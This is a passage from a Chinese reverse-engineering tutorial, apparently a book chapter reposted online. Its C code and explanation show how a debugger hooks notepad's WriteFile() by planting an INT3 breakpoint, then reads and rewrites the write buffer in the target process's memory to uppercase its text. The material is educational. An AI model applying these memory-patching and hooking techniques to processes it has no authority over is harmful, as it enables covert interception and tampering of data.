class="hljs-params">)</span>;<br></code></pre></td></tr></table></figure><p>然后进人DebugLoop()函数，处理来自被调试者的调试事件。</p><blockquote><p>另一种启动调试的方法是使用CreateProcess() API,从一开始就直接以调试模式运行相关进程。更详细的说明请参考MSDN。</p></blockquote><h2 id="30-6-2-DebugLoop"><a href="#30-6-2-DebugLoop" class="headerlink" title="30.6.2 DebugLoop()"></a>30.6.2 DebugLoop()</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">DebugLoop</span><span class="hljs-params">()</span><br>&#123;<br>    DEBUG_EVENT de;<br>    DWORD dwContinueStatus;<br><br>    <span class="hljs-comment">// 等待被调试者发生事件</span><br>    <span class="hljs-keyword">while</span>( WaitForDebugEvent(&amp;de, INFINITE) )<br>    &#123;<br>        dwContinueStatus = DBG_CONTINUE;<br><br>        <span class="hljs-comment">// 被调试进程生成或附加事件</span><br>        <span class="hljs-keyword">if</span>( CREATE_PROCESS_DEBUG_EVENT == de.dwDebugEventCode )<br>        &#123;<br>            OnCreateProcessDebugEvent(&amp;de);<br>        &#125;<br>        <span class="hljs-comment">// 异常事件</span><br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>( EXCEPTION_DEBUG_EVENT == de.dwDebugEventCode )<br>        &#123;<br>            <span class="hljs-keyword">if</span>( OnExceptionDebugEvent(&amp;de) )<br>                <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-comment">// 被调试进程终止事件</span><br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>( EXIT_PROCESS_DEBUG_EVENT == de.dwDebugEventCode )<br>        &#123;<br>            <span class="hljs-comment">// 被调试者终止-&gt;调试器终止</span><br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        <span class="hljs-comment">// 再次运行被调试者</span><br>        ContinueDebugEvent(de.dwProcessId, de.dwThreadId, dwContinueStatus);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>DebugLoop()函数的工作原理类似于窗口过程函数（WndProc），它从被调试者处接收事件并处理，然后使被调试者继续运行。DebugLoop()函数代码比较简单，结合代码中的注释就能理解。</p><p>下面看看其中比较重要的2个API。</p><p>顾名思义，WaitForDebugEvent() API （出处： MSDN）是一个等待被调试者发生调试事件的函数（行为动作类似于WaitForSingleObject() API）。</p><p>DebugLoop()函数代码中，若发生调试事件，WaitForDebugEvdnt() API就会将相关事件信息设置到其第一个参数的变量（DEBUG_EVENT结构体对象），然后立刻返回。DEBUG_EVENT结构体定义（出处：MSDN）如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">DEBUG_EVENT</span> &#123;</span><br>  DWORD dwDebugEventCode;<br>  DWORD dwProcessId;<br>  DWORD dwThreadId;<br>  <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>    EXCEPTION_DEBUG_INFO      Exception;<br>    CREATE_THREAD_DEBUG_INFO  CreateThread;<br>    CREATE_PROCESS_DEBUG_INFO CreateProcessInfo;<br>    EXIT_THREAD_DEBUG_INFO    ExitThread;<br>    EXIT_PROCESS_DEBUG_INFO   ExitProcess;<br>    LOAD_DLL_DEBUG_INFO       LoadDll;<br>    UNLOAD_DLL_DEBUG_INFO     UnloadDll;<br>    OUTPUT_DEBUG_STRING_INFO  DebugString;<br>    RIP_INFO                  RipInfo;<br>  &#125; u;<br>&#125; DEBUG_EVENT, *LPDEBUG_EVENT;<br></code></pre></td></tr></table></figure><p>前面的讲解中已经提到过，共有9种调试事件。DEBUG_EVENT.dwDebugEventCode成员会被设置为9种事件中的一种，根据相关事件的种类，也会设置适当的DEBUG_EVENT.u （union）成员（DEBUG_EVENT.u共用体成员内部也由9个结构体组成，它们对应于事件种类的个数）。</p><blockquote><p>例如，发生异常事件时，dwDebugEventCode成员会被设置为EXCEPTION_DEBUG_EVENT, u.Exception结构体也会得到设置。</p></blockquote><p>ContinueDebugEvent() API (出处：MSDN )是一个使被调试者继续运行的函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL <span class="hljs-title function_">ContinueDebugEvent</span><span class="hljs-params">(</span><br><span class="hljs-params">    DWORD dwProcessId,</span><br><span class="hljs-params">     <span class="hljs-comment">// process to continue</span></span><br><span class="hljs-params">    DWORD dwThreadId,</span><br><span class="hljs-params">     <span class="hljs-comment">// thread to continue</span></span><br><span class="hljs-params">    DWORD dwContinueStatus</span><br><span class="hljs-params">     <span class="hljs-comment">// continuation status</span></span><br><span class="hljs-params">)</span>;<br></code></pre></td></tr></table></figure><p>ContinueDebugEvent() API 的最后一个参数 dwContinueStatus 的值为 DBG_CONTINUE或DBG_EXCEPTION_NOTHANDLED。</p><p>若处理正常，则其值设置为DBG_CONTINUE；若无法处理，或希望在应用程序的SEH中处理，则其值设置为DBG_EXCEPTION_NOT_HANDLED。</p><p>SEH是Windows提供的异常处理机制。关于这种异常处理及反调试技术将在第49章中详细讲解。</p><p>代码30-2的DebugLoop()函数处理3种调试事件，如下所示。 </p><p>□ EXIT_PROCESS_DEBUG_EVENT<br>□ CREATE_PROCESS_DEBUG_EVENT<br>□ EXCEPTION_DEBUG_EVENT</p><p>下面分别看看这3个事件</p><h2 id="30-6-3-EXIT-PROCESS-DEBUG-EVENT"><a href="#30-6-3-EXIT-PROCESS-DEBUG-EVENT" class="headerlink" title="30.6.3 EXIT_PROCESS_DEBUG_EVENT"></a>30.6.3 EXIT_PROCESS_DEBUG_EVENT</h2><p>被调试进程终止时会触发该事件。本章的示例代码中发生该事件时，调试器与被调试者将一起终止。</p><h2 id="30-6-4-CREATE-PROCESS-DEBUG-EVENT-OnCreateProcessDebugEvent"><a href="#30-6-4-CREATE-PROCESS-DEBUG-EVENT-OnCreateProcessDebugEvent" class="headerlink" title="30.6.4 CREATE_PROCESS_DEBUG_EVENT-OnCreateProcessDebugEvent()"></a>30.6.4 CREATE_PROCESS_DEBUG_EVENT-OnCreateProcessDebugEvent()</h2><p>OnCreateProcessDebugEvent()是CREATE_PROCESS_DEBUG_EVENT事件句柄，被调试进程启动（或者附加）时即调用执行该函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL <span class="hljs-title function_">OnCreateProcessDebugEvent</span><span class="hljs-params">(LPDEBUG_EVENT pde)</span><br>&#123;<br>    <span class="hljs-comment">// WriteFile() API 地址</span><br>    g_pfWriteFile = GetProcAddress(GetModuleHandleA(<span class="hljs-string">&quot;kernel32.dll&quot;</span>), <span class="hljs-string">&quot;WriteFile&quot;</span>);<br><br>    <span class="hljs-comment">// API “钩子” - WriteFile()</span><br>    <span class="hljs-comment">// 更改第一个字节为0xCC (INT3)</span><br>    <span class="hljs-comment">// originalbyte是g_chOrgByte备份</span><br>    <span class="hljs-built_in">memcpy</span>(&amp;g_cpdi, &amp;pde-&gt;u.CreateProcessInfo, <span class="hljs-keyword">sizeof</span>(CREATE_PROCESS_DEBUG_INFO));<br>    ReadProcessMemory(g_cpdi.hProcess, g_pfWriteFile, <br>                      &amp;g_chOrgByte, <span class="hljs-keyword">sizeof</span>(BYTE), <span class="hljs-literal">NULL</span>);<br>    WriteProcessMemory(g_cpdi.hProcess, g_pfWriteFile, <br>                       &amp;g_chINT3, <span class="hljs-keyword">sizeof</span>(BYTE), <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><p>首先获取WriteFile() API的起始地址，需要注意，它获取的不是被调试进程的内存地址，而是调试进程的内存地址。对于Windows OS的系统DLL而言，它们在所有进程中都会加载到相同地址（虚拟内存），所以上面这样做是没有任何问题的。</p><p>g_cpdi是CREATE_PROCESS_DEBUG_INFO结构体（出处：MSDN）变量。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">CREATE_PROCESS_DEBUG_INFO</span> &#123;</span><br>  HANDLE                 hFile;<br>  HANDLE                 hProcess;<br>  HANDLE                 hThread;<br>  LPVOID                 lpBaseOfImage;<br>  DWORD                  dwDebugInfoFileOffset;<br>  DWORD                  nDebugInfoSize;<br>  LPVOID                 lpThreadLocalBase;<br>  LPTHREAD_START_ROUTINE lpStartAddress;<br>  LPVOID                 lpImageName;<br>  WORD                   fUnicode;<br>&#125; CREATE_PROCESS_DEBUG_INFO, *LPCREATE_PROCESS_DEBUG_INFO;<br></code></pre></td></tr></table></figure><p>通过CREATE_PROCESS_DEBUG_INFO结构体的hProcess成员（被调试进程的句柄），可以钩取WriteFile() API （不使用调试方法时，可以使用OpenProcess() API获取相应进程的句柄）。调试方法中，钩取的方法非常简单。</p><p>只要在API的起始位置设置好断点即可。由于调试器拥有被调试进程的句柄（带有调试权限），所以可以使用ReadProcessMemory()、WriteProcessMemory() API对被调试进程的内存空间自由进行读写操作。用上面的函数可以向被调试者设置断点（INT3 0xCC）0通过ReadProcessMemory()读取WriteFile() API的第一个字节，并将其存储到g_chOrgByte变量。如图30-12所示，WriteFile()API的第一个字节为0x6A （Windows XP操作系统）。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC30%E7%AB%A0%20%E8%AE%B0%E4%BA%8B%E6%9C%ACWriteFile()%20API%E9%92%A9%E5%8F%96.assets/image-20220226105643030.png" alt="图30-12 WriteFile()第一个字节"></p><p>g_chOrgByte变量中存储的是WriteFile() API的第一个字节，后面“脱钩”时会用到。然后使用WriteProcessMemory() API将WriteFile() API的第一个字节更改为0xCC （参考图30-13）。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC30%E7%AB%A0%20%E8%AE%B0%E4%BA%8B%E6%9C%ACWriteFile()%20API%E9%92%A9%E5%8F%96.assets/image-20220226111210557.png" alt="图30-13 设置OxCC"></p><p>0xCC是IA-32指令，对应于INT3指令，也就是断点。CPU遇到INT3指令时会暂停执行程序，并触发异常。若相应程序正处于调试中，则将控制权转移到调试器，由调试器处理。这也是一般调试器设置断点的基本原理。</p><p>这样一来，被调试进程调用WriteFile()API时，控制权都会转移给调试器。</p><h2 id="30-6-5-EXCEPTION-DEBUG-EVENT-OnExceptionDebugEvent"><a href="#30-6-5-EXCEPTION-DEBUG-EVENT-OnExceptionDebugEvent" class="headerlink" title="30.6.5 EXCEPTION_DEBUG_EVENT-OnExceptionDebugEvent()"></a>30.6.5 EXCEPTION_DEBUG_EVENT-OnExceptionDebugEvent()</h2><p>OnExceptionDebugEvent()是EXCEPTION_DEBUG_EVENT事件句柄，它处理被调试者的INT3指令。代码30-4是OnExceptionDebugEvent()函数代码，下面看一下它的核心部分。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL <span class="hljs-title function_">OnExceptionDebugEvent</span><span class="hljs-params">(LPDEBUG_EVENT pde)</span><br>&#123;<br>    CONTEXT ctx;<br>    PBYTE lpBuffer = <span class="hljs-literal">NULL</span>;<br>    DWORD dwNumOfBytesToWrite, dwAddrOfBuffer, i;<br>    PEXCEPTION_RECORD per = &amp;pde-&gt;u.Exception.ExceptionRecord;<br><br>    <span class="hljs-comment">// 是断点异常(INT3)时</span><br>    <span class="hljs-keyword">if</span>( EXCEPTION_BREAKPOINT == per-&gt;ExceptionCode )<br>    &#123;<br>        <span class="hljs-comment">// 断点地址为WriteFile() API地址时</span><br>        <span class="hljs-keyword">if</span>( g_pfWriteFile == per-&gt;ExceptionAddress )<br>        &#123;<br>            <span class="hljs-comment">// #1. Unhook</span><br>            <span class="hljs-comment">// 将0xCC恢复为orignal byte</span><br>            WriteProcessMemory(g_cpdi.hProcess, g_pfWriteFile, <br>                               &amp;g_chOrgByte, <span class="hljs-keyword">sizeof</span>(BYTE), <span class="hljs-literal">NULL</span>);<br><br>            <span class="hljs-comment">// #2. 获取线程上下文</span><br>            ctx.ContextFlags = CONTEXT_CONTROL;<br>            GetThreadContext(g_cpdi.hThread, &amp;ctx);<br><br>            <span class="hljs-comment">// #3. 获取WriteFile()的param 2、3值</span><br>            <span class="hljs-comment">// 函数参数存在于相应进程的栈</span><br>            <span class="hljs-comment">// param 2 : ESP + 0x8</span><br>            <span class="hljs-comment">// param 3 : ESP + 0xC</span><br>            ReadProcessMemory(g_cpdi.hProcess, (LPVOID)(ctx.Esp + <span class="hljs-number">0x8</span>), <br>                              &amp;dwAddrOfBuffer, <span class="hljs-keyword">sizeof</span>(DWORD), <span class="hljs-literal">NULL</span>);<br>                              <span class="hljs-comment">// Read DWORD大小的数据放到 dwAddrOfBuffer</span><br>            ReadProcessMemory(g_cpdi.hProcess, (LPVOID)(ctx.Esp + <span class="hljs-number">0xC</span>), <br>                              &amp;dwNumOfBytesToWrite, <span class="hljs-keyword">sizeof</span>(DWORD), <span class="hljs-literal">NULL</span>);<br>                              <span class="hljs-comment">// // Read DWORD大小的数据放到dwNumOfBytesToWrite</span><br><br>            <span class="hljs-comment">// #4. 分配临时缓冲区</span><br>            lpBuffer = (PBYTE)<span class="hljs-built_in">malloc</span>(dwNumOfBytesToWrite+<span class="hljs-number">1</span>);<br>            <span class="hljs-built_in">memset</span>(lpBuffer, <span class="hljs-number">0</span>, dwNumOfBytesToWrite+<span class="hljs-number">1</span>);<br><br>            <span class="hljs-comment">// #5. 复制WriteFile()缓冲区到临时缓冲区</span><br>            ReadProcessMemory(g_cpdi.hProcess, (LPVOID)dwAddrOfBuffer, <br>                              lpBuffer, dwNumOfBytesToWrite, <span class="hljs-literal">NULL</span>);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n### original string ###\n%s\n&quot;</span>, lpBuffer);<br><br>            <span class="hljs-comment">// #6. 将小写字母转换为大写字母</span><br>            <span class="hljs-keyword">for</span>( i = <span class="hljs-number">0</span>; i &lt; dwNumOfBytesToWrite; i++ )<br>            &#123;<br>                <span class="hljs-keyword">if</span>( <span class="hljs-number">0x61</span> &lt;= lpBuffer[i] &amp;&amp; lpBuffer[i] &lt;= <span class="hljs-number">0x7A</span> )<br>                    lpBuffer[i] -= <span class="hljs-number">0x20</span>;<br>            &#125;<br><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n### converted string ###\n%s\n&quot;</span>, lpBuffer);<br><br>            <span class="hljs-comment">// #7. 将变换后的缓冲区复制到WriteFile()缓冲区</span><br>            WriteProcessMemory(g_cpdi.hProcess, (LPVOID)dwAddrOfBuffer, <br>                               lpBuffer, dwNumOfBytesToWrite, <span class="hljs-literal">NULL</span>);<br><br>            <span class="hljs-comment">// #8. 释放临时缓冲区</span><br>            <span class="hljs-built_in">free</span>(lpBuffer);<br><br>            <span class="hljs-comment">// #9. 将线程上下文的EIP更改为WriteFile()的首地址</span><br>            <span class="hljs-comment">// (当前为WriteFile()+1位置, INT3命令之后)</span><br>            <span class="hljs-comment">// 简而言之: 执行了INT3后, EIP+1, 需要把EIP+1再还原为EIP原来的值</span><br>            ctx.Eip = (DWORD)g_pfWriteFile; <span class="hljs-comment">// 还原EIP </span><br>            SetThreadContext(g_cpdi.hThread, &amp;ctx);<br><br>            <span class="hljs-comment">// #10. 运行被调试进程</span><br>            ContinueDebugEvent(pde-&gt;dwProcessId, pde-&gt;dwThreadId, DBG_CONTINUE);<br>            Sleep(<span class="hljs-number">0</span>);<br><br>            <span class="hljs-comment">// #11. API Hook</span><br>            WriteProcessMemory(g_cpdi.hProcess, g_pfWriteFile, <br>                               &amp;g_chINT3, <span class="hljs-keyword">sizeof</span>(BYTE), <span class="hljs-literal">NULL</span>);<br><br>            <span class="hljs-keyword">return</span> TRUE;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> FALSE;<br>&#125;<br></code></pre></td></tr></table></figure><p>OnExceptionDebugEvent()函数代码有些多，接下来分析核心部分。首先，if语句用于检测异常是否为EXCEPTION_BREAKPOINT异常（除此之外，还有大约19种异常，请参考前几节内容）。然后，用if语句检测发生断点的地址是否与kernel32!WriteFile()的起始地址一致（OnCreateProcessDebugEvent()已经事先获取了WriteFile()的起始地址）。若满足条件，则继续执行以下代码。</p><p>#1. “脱钩”（删除API钩子）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">WriteProcessMemory(g_cpdi.hProcess, g_pfWriteFile, <br>                   &amp;g_chOrgByte, <span class="hljs-keyword">sizeof</span>(BYTE), <span class="hljs-literal">NULL</span>);<br></code></pre></td></tr></table></figure><p>首先需要“脱钩”（删除API “钩子”），因为在将小写字母转换为大写字母后需要正常调用WriteFile()函数（请参考前面“‘脱钩’ &amp; ‘钩子’”部分中的相关说明）。类似“钩子”、“脱钩”的方法也非常简单，只要将0xCC恢复原值（g_chOrgByte）即可。</p><blockquote><p>可以根据实际需要取消对相关API的调用，也可以调用用户自定义的MyWriteFile()函数，所以“脱钩”过程不是必须的。使用时，要根据具体情况灵活选择处理方法。</p></blockquote><p>#2.获取线程上下文（Thread Context）</p><p>这是第一次提到“线程上下文”，所有程序在内存中都以进程为单位运行，而进程的实际指令代码以线程为单位运行。Windows OS是一个多线程（multi-thread）操作系统，同一进程中可以同时运行多个线程。多任务（multi-tasking）是将CPU资源划分为多个时间片（time-slice），然后平等地逐一运行所有线程（考虑线程优先级）。CPU运行完一个线程的时间片而切换到其他线程时间片时，它必须将先前线程处理的内容准确备份下来，这样再次运行它时才能正常无误。</p><p>再次运行先前线程时，必须有运行所需信息，这些重要信息指的就是CPU中各寄存器的值。通过这些值，才能保证CPU能够再次准确运行它（内存信息栈&amp;堆存在于相应进程的虚拟空间，不需要另外保护）。负责保存线程CPU寄存器信息的就是CONTEXT结构体（每个线程都对应一个CONTEXT结构体），它的定义如下（出处：MS VC++： winnt.h）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">CONTEXT</span> &#123;</span><br>  ULONG              ContextFlags;<br>  ULONG              Dr0;<br>  ULONG              Dr1;<br>  ULONG              Dr2;<br>  ULONG              Dr3;<br>  ULONG              Dr6;<br>  ULONG              Dr7;<br>  FLOATING_SAVE_AREA FloatSave;<br>  ULONG              SegGs;<br>  ULONG              SegFs;<br>  ULONG              SegEs;<br>  ULONG              SegDs;<br>  ULONG              Edi;<br>  ULONG              Esi;<br>  ULONG              Ebx;<br>  ULONG              Edx;<br>  ULONG              Ecx;<br>  ULONG              Eax;<br>  ULONG              Ebp;<br>  ULONG              Eip;<br>  ULONG              SegCs;<br>  ULONG              EFlags;<br>  ULONG              Esp;<br>  ULONG              SegSs;<br>  UCHAR              ExtendedRegisters[MAXIMUM_SUPPORTED_EXTENSION];<br>&#125; CONTEXT;<br></code></pre></td></tr></table></figure><p>下面是获取线程上下文的代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">ctx.ContextFlags = CONTEXT_CONTROL;<br>GetThreadContext(g_cpdi.hThread, &amp;ctx);<br></code></pre></td></tr></table></figure><p>像这样调用GetThreadContext() API （出处：MSDN），即可将指定线程（g_cpdi.hThread）的CONTEXT存储到ctx结构体变量（g_cpdi.hThread是被调试者的主线程句柄）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL <span class="hljs-title function_">GetThreadContext</span><span class="hljs-params">(</span><br><span class="hljs-params">HANDLE hThread,</span><br><span class="hljs-params"> <span class="hljs-comment">// handle of thread with context</span></span><br><span class="hljs-params">LPCONTEXT lpContext</span><br><span class="hljs-params"> <span class="hljs-comment">// address of context structure</span></span><br><span class="hljs-params">)</span>;<br></code></pre></td></tr></table></figure><p>#3.获取WriteFile()的param 2、3值</p><p>调用WriteFile()函数时，我们要在传递过来的参数中知道param2（数据缓冲区地址）与param3 （缓冲区大小）这2个参数。函数参数存储在栈中，通过#2中获取的CONTEXT.Esp成员可以分别获得它们的值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 函数参数存在于相应进程的栈</span><br><span class="hljs-comment">// param 2 : ESP + 0x8</span><br><span class="hljs-comment">// param 3 : ESP + 0xC</span><br>ReadProcessMemory(g_cpdi.hProcess, (LPVOID)(ctx.Esp + <span class="hljs-number">0x8</span>), <br>                  &amp;dwAddrOfBuffer, <span class="hljs-keyword">sizeof</span>(DWORD), <span class="hljs-literal">NULL</span>);<br><span class="hljs-comment">// Read DWORD大小的数据放到 dwAddrOfBuffer</span><br>ReadProcessMemory(g_cpdi.hProcess, (LPVOID)(ctx.Esp + <span class="hljs-number">0xC</span>), <br>                  &amp;dwNumOfBytesToWrite, <span class="hljs-keyword">sizeof</span>(DWORD), <span class="hljs-literal">NULL</span>);<br><span class="hljs-comment">// // Read DWORD大小的数据放到dwNumOfBytesToWrite</span><br></code></pre></td></tr></table></figure><blockquote><ul><li><p>存储在dwAddrOfBuffer中的数据缓冲区地址是被调试者（notepad.exe）虚拟内<br>存空间中的地址。 </p></li><li><p>param2与param3分别为ESP+0x8、ESP+0xC,原因请参考第7章。</p></li></ul></blockquote><p>#4.~#8. 把小写字母转换为大写字母后覆写WriteFile()缓冲区<br>获取数据缓冲区的地址与大小后，将其内容读到调试器的内存空间，把小写字母转换为大写字母。然后将修改后的大写字母覆写到原位置（被调试者的虚拟内存）。整个代码不难，结合代码中的注释就能轻松理解。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// #4. 分配临时缓冲区</span><br>lpBuffer = (PBYTE)<span class="hljs-built_in">malloc</span>(dwNumOfBytesToWrite+<span class="hljs-number">1</span>);<br><span class="hljs-built_in">memset</span>(lpBuffer, <span class="hljs-number">0</span>, dwNumOfBytesToWrite+<span class="hljs-number">1</span>);<br><br><span class="hljs-comment">// #5. 复制WriteFile()缓冲区到临时缓冲区</span><br>ReadProcessMemory(g_cpdi.hProcess, (LPVOID)dwAddrOfBuffer, <br>                  lpBuffer, dwNumOfBytesToWrite, <span class="hljs-literal">NULL</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n### original string ###\n%s\n&quot;</span>, lpBuffer);<br><br><span class="hljs-comment">// #6. 将小写字母转换为大写字母</span><br><span class="hljs-keyword">for</span>( i = <span class="hljs-number">0</span>; i &lt; dwNumOfBytesToWrite; i++ )<br>&#123;<br>    <span class="hljs-keyword">if</span>( <span class="hljs-number">0x61</span> &lt;= lpBuffer[i] &amp;&amp; lpBuffer[i] &lt;= <span class="hljs-number">0x7A</span> )<br>        lpBuffer[i] -= <span class="hljs-number">0x20</span>;<br>&#125;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n### converted string ###\n%s\n&quot;</span>, lpBuffer);<br><br><span class="hljs-comment">// #7. 将变换后的缓冲区复制到WriteFile()缓冲区</span><br>WriteProcessMemory(g_cpdi.hProcess, (LPVOID)dwAddrOfBuffer, <br>                   lpBuffer, dwNumOfBytesToWrite, <span class="hljs-literal">NULL</span>);<br><br><span class="hljs-comment">// #8. 释放临时缓冲区</span><br><span class="hljs-built_in">free</span>(lpBuffer);<br></code></pre></td></tr></table></figure><p>#9.把线程上下文的EIP修改为WriteFile()起始地址</p><p>下面将#2中获取的CONTEXT结构体的Eip成员修改为WriteFile()的起始地址。EIP的当前地址为WriteFile()+1 （参考前面“#执行流”中的说明）。</p><p>修改好CONTEXT.Eip成员后，调用SetThreadContext() API。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// #9. 将线程上下文的EIP更改为WriteFile()的首地址</span><br><span class="hljs-comment">// (当前为WriteFile()+1位置, INT3命令之后)</span><br><span class="hljs-comment">// 简而言之: 执行了INT3后, EIP+1, 需要把EIP+1再还原为EIP原来的值</span><br>ctx.Eip = (DWORD)g_pfWriteFile; <span class="hljs-comment">// 还原EIP </span><br>SetThreadContext(g_cpdi.hThread, &amp;ctx);<br></code></pre></td></tr></table></figure><p>下面是SetThreadContext()API （出处：MSDN）：</p><figure class="highlight c"><table><tr><td 